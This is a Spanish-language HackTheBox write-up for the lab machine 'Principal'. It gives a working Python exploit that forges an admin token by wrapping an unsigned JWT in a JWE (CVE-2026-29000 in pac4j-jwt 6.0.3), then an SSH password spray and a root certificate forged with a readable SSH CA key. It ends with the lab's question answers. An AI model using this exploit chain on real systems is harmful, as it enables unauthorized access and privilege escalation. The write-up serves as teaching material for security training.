# Writeup - Principal (HackTheBox)

**Máquina:** Principal  
**Plataforma:** HackTheBox  
**Sistema:** Ubuntu 24.04.4 LTS  
**IP:** 10.129.244.220  
**Objetivo:** Obtener user.txt y root.txt

## Resumen

Principal explota dos vulnerabilidades de confianza criptográfica mal colocada. El foothold aprovecha **CVE-2026-29000**, un bypass de autenticación en pac4j-jwt 6.0.3 donde un PlainJWT sin firma envuelto en un JWE válido elude la verificación de firma. La escalada abusa de un **SSH CA** que firma cualquier certificado sin validar el principal, permitiendo forjar un certificado para `root`. Ambas etapas explotan la misma clase de fallo: el sistema verifica el sobre criptográfico pero nunca valida la identidad contenida dentro.

---

## 1. Reconocimiento

### Nmap

```bash
nmap -p- -sS --open --min-rate=5000 -n -Pn 10.129.244.220
nmap -p22,8080 -sCV 10.129.244.220
```

```
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 9.6p1 Ubuntu 3ubuntu13.14
8080/tcp open  http-proxy Jetty
|_http-title: Principal Internal Platform - Login
|_http-server-header: Jetty
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.1 404 Not Found
|     X-Powered-By: pac4j-jwt/6.0.3
```

Puerto 8080 ejecuta `Principal Internal Platform` con **pac4j-jwt/6.0.3**.

### Web Reconnaissance — app.js

El JS en `/static/js/app.js` documenta el flujo de autenticación:

```javascript
const AUTH_ENDPOINT = '/api/auth/login';
const JWKS_ENDPOINT = '/api/auth/jwks';
const DASHBOARD_ENDPOINT = '/api/dashboard';
const USERS_ENDPOINT = '/api/users';
const SETTINGS_ENDPOINT = '/api/settings';
```

- Tokens JWE cifrados con RSA-OAEP-256 + A128GCM
- JWT interno firmado con RS256
- Clave pública en `/api/auth/jwks`

### JWKS endpoint

```bash
curl -s http://10.129.244.220:8080/api/auth/jwks
```

```json
{
  "keys": [{
    "kty": "RSA",
    "e": "AQAB",
    "kid": "enc-key-1",
    "n": "lTh54vtBS1NAWrxAFU1NEZdrVxPeSMhHZ5NpZX..."
  }]
}
```

Solo se expone la **encryption key**. La **signing key** no está disponible públicamente.

---

## 2. CVE-2026-29000 → Token admin

### La vulnerabilidad

pac4j-jwt 6.0.3 `JwtAuthenticator`:
1. Descifra el JWE con la clave privada RSA del servidor
2. Extrae el payload interno y llama a `toSignedJWT()`
3. Si el payload es un `PlainJWT` (`{"alg":"none"}`), `toSignedJWT()` retorna `null`
4. El código verifica `if (signedJWT != null)` antes de validar la firma
5. Cuando `signedJWT` es `null`, la verificación de firma se omite por completo

### Exploit

```python
#!/usr/bin/env python3
import json, time, base64, requests
from jwcrypto import jwk, jwe

TARGET = "http://10.129.244.220:8080"

resp = requests.get(f"{TARGET}/api/auth/jwks")
key_data = resp.json()['keys'][0]
pub_key = jwk.JWK(**key_data)

def b64url(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

now = int(time.time())
plain_jwt = f"{b64url(json.dumps({'alg':'none'}).encode())}.{b64url(json.dumps({'sub':'admin','role':'ROLE_ADMIN','iss':'principal-platform','iat':now,'exp':now+3600}).encode())}."

jwe_token = jwe.JWE(plain_jwt.encode(), recipient=pub_key,
                    protected=json.dumps({"alg":"RSA-OAEP-256","enc":"A128GCM","kid":key_data['kid'],"cty":"JWT"}))
forged = jwe_token.serialize(compact=True)

headers = {"Authorization": f"Bearer {forged}"}
resp = requests.get(f"{TARGET}/api/dashboard", headers=headers)
print(resp.json())
```

```bash
python3 exploit.py
```

```
[*] Fetching JWKS...
[+] Got RSA public key (kid: enc-key-1)
[*] Crafted PlainJWT with sub=admin, role=ROLE_ADMIN
[+] Forged JWE token created
[*] Accessing /api/dashboard...
[+] Status: 200
[+] Authenticated as: admin (ROLE_ADMIN)
```

### Extraer credenciales SSH

```bash
curl -s http://10.129.244.220:8080/api/settings -H "Authorization: Bearer $TOKEN"
```

```json
{
  "security": {
    "encryptionKey": "<REDACTED>"
  }
}
```

El campo `encryptionKey` es la contraseña de SSH compartida.

```bash
curl -s http://10.129.244.220:8080/api/users -H "Authorization: Bearer $TOKEN"
```

```json
{
  "users": [
    { "username": "admin",       "role": "ROLE_ADMIN" },
    { "username": "svc-deploy",  "role": "deployer" },
    { "username": "jthompson",   "role": "ROLE_USER" },
    { "username": "amorales",    "role": "ROLE_USER" },
    { "username": "bwright",     "role": "ROLE_MANAGER" },
    { "username": "kkumar",      "role": "ROLE_ADMIN" },
    { "username": "mwilson",     "role": "ROLE_USER" },
    { "username": "lzhang",      "role": "ROLE_MANAGER" }
  ]
}
```

---

## 3. Password Spray → svc-deploy

```bash
nxc ssh 10.129.244.220 -u users.txt -p '<REDACTED>'
```

```
SSH  10.129.244.220  22   [-] admin:<REDACTED>
SSH  10.129.244.220  22   [+] svc-deploy:<REDACTED>  Linux - Shell access!
```

```bash
ssh svc-deploy@10.129.244.220
```

```
svc-deploy@principal:~$ cat user.txt
<REDACTED>
```

---

## 4. SSH CA Certificate Forgery → root

### Enumeración

```bash
svc-deploy@principal:~$ id
uid=1001(svc-deploy) gid=1002(svc-deploy) groups=1002(svc-deploy),1001(deployers)

svc-deploy@principal:~$ ls -la /opt/principal/ssh/
total 20
drwxr-x--- 2 root deployers 4096 Mar 11 04:22 .
drwxr-xr-x 5 root root      4096 Mar 11 04:22 ..
-rw-r----- 1 root deployers  288 Mar  5 21:05 README.txt
-rw-r----- 1 root deployers 3381 Mar  5 21:05 ca
-rw-r--r-- 1 root root       742 Mar  5 21:05 ca.pub

svc-deploy@principal:~$ cat /etc/ssh/sshd_config.d/60-principal.conf
```

```
# Principal machine SSH configuration
PubkeyAuthentication yes
PasswordAuthentication yes
PermitRootLogin prohibit-password
TrustedUserCAKeys /opt/principal/ssh/ca.pub
```

No hay `AuthorizedPrincipalsFile`. Cualquier certificado firmado por la CA es aceptado y el principal se compara contra el username de login.

### Abuso

```bash
svc-deploy@principal:~$ ssh-keygen -t ed25519 -f /tmp/pwn -N ""
svc-deploy@principal:~$ ssh-keygen -s /opt/principal/ssh/ca -I "pwn-root" -n root -V +1h /tmp/pwn.pub
Signed user key /tmp/pwn-cert.pub: id "pwn-root" serial 0 for root valid from ...
```

```bash
svc-deploy@principal:~$ ssh-keygen -L -f /tmp/pwn-cert.pub
```

```
/tmp/pwn-cert.pub:
        Type: ssh-ed25519-cert-v01@openssh.com user certificate
        Signing CA: RSA SHA256:bExSfFTUaopPXEM+lTW6QM0uXnsy7CICk0+p0UKK3ps
        Key ID: "pwn-root"
        Principals: root
```

```bash
svc-deploy@principal:~$ ssh -i /tmp/pwn root@localhost
```

```
root@principal:~# cat /root/root.txt
<REDACTED>
```

---

## Resumen de la cadena de ataque

| Paso | Técnica | Resultado |
|-------|---------|-----------|
| 1 | Nmap + enumeración web | Puerto 8080 con pac4j-jwt/6.0.3, endpoints API en app.js |
| 2 | CVE-2026-29000 — PlainJWT + JWE forgery | Token admin ROLE_ADMIN |
| 3 | Extraer settings + users vía API | Password `<REDACTED>` + lista de usuarios |
| 4 | Password spray SSH | `svc-deploy:<REDACTED>` + `user.txt` |
| 5 | Leer CA privada en `/opt/principal/ssh/ca` | Clave privada RSA 4096-bit de la CA |
| 6 | Firmar certificado con principal `root` | Certificado SSH válido para root |
| 7 | SSH con certificado forjado | Shell como `root` + `root.txt` |

---

## Preguntas del laboratorio

**How many open TCP ports are listening on Principal?**
> 2 — puertos 22 (SSH) y 8080 (HTTP Jetty con pac4j-jwt/6.0.3).

**What version of pac4j-jwt is in use?**
> `6.0.3` — visible en el header `X-Powered-By: pac4j-jwt/6.0.3` y confirmado en `/api/settings`.

**Which endpoint serves the main JavaScript file for the web application?**
> `/static/js/app.js`

**What API endpoint holds a public key?**
> `/api/auth/jwks`

**What is the plaintext password that can be found in the web application?**
> `<REDACTED>` — encontrado en `/api/settings` bajo `security.encryptionKey`.

**Which user can successfully authenticate to SSH using the plaintext password?**
> `svc-deploy`

**Submit the flag located in the svc-deploy user's home directory.**
> `<REDACTED>`

**What interesting group is svc-deploy part of?**
> `deployers` (gid=1001)

**What directory does the deployers group have read access to?**
> `/opt/principal/ssh/`

**Which file contains a custom sshd configuration for Principal?**
> `/etc/ssh/sshd_config.d/60-principal.conf`

**Submit the flag located in the root user's home directory.**
> `<REDACTED>`
